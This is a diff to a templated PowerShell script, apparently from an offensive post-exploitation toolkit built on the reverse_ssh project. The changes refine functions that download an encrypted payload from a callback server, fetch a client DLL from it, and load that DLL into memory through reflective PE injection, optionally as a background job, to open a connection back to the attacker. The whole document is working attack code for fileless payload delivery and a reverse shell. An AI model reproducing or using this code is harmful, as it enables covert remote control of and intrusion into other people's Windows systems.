@@ -111,9 +111,12 @@ function Transport-String {
         $args += '&s=t'
     {% endif %}
     $path = "${1}${args}"
+    {{'Write-Debug "Requesting $path..."'|debug}}
     $path = Encrypt-String $path
     $path = $path.replace('/', '_').replace('+', '-')
-    return Decrypt-String ($WebClient.DownloadString("${CALLBACK_URL}${path}")) $3
+    $buffer = $WebClient.DownloadString("${CALLBACK_URL}${path}")
+    {{'Write-Debug "Decrypting $($buffer.length) bytes..."'|debug}}
+    Decrypt-String $buffer $3
 }
 
 function Unzip-Code {
@@ -897,7 +900,15 @@ Load the client.dll of the reverse_ssh project.
     $transport_args = @{"arch"="x64"}
     $code = Transport-String "rssh" $transport_args $True
 
-    # TODO convert from bytes
+    if ($code.length -gt 100 ) {
+        {{'Write-Debug "Client.dll received"'|debug}}
+        # It's the content of the dll
+        return $code
+    }
+
+    # It's a message, not the content of the dll
+    $code = [System.Text.Encoding]::UTF8.GetString($code)
+
     if ($code -eq "now_building") {
         throw "client.dll is now being built. Try again later."
     }
@@ -909,8 +920,6 @@ Load the client.dll of the reverse_ssh project.
     if ($code -eq "error") {
         throw "Error while retrieving client.dll; check server logs."
     }
-
-    return $code
 }
 
 
@@ -929,9 +938,23 @@ This Cmdlet leverages the reverse_ssh project written in golang
 The host must be reachable directly without any proxy.
 
 #>
-    Get-BuiltinModule "Invoke-ReflectivePEInjection"
-    $DLLBytes = Get-RSSHClientDLL  # TODO consider arch
-    Invoke-ReflectivePEInjection -PEBytes $DLLBytes
+    param (
+        [parameter(Mandatory=$false)] [Switch] $Foreground
+    )
+
+    if (-not (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)) {
+        Get-BuiltinModule "Invoke-ReflectivePEInjection"
+    }
+
+    $DLLBytes = Get-RSSHClientDLL
+
+    {{'Write-Debug "Connecting back..."'|debug}}
+
+    if ($Foreground) {
+        Invoke-ReflectivePEInjection -PEBytes $DLLBytes
+    } else {
+        Start-Job -ScriptBlock { Invoke-ReflectivePEInjection -PEBytes $DLLBytes }
+    }
 }
 {% endif %}
 
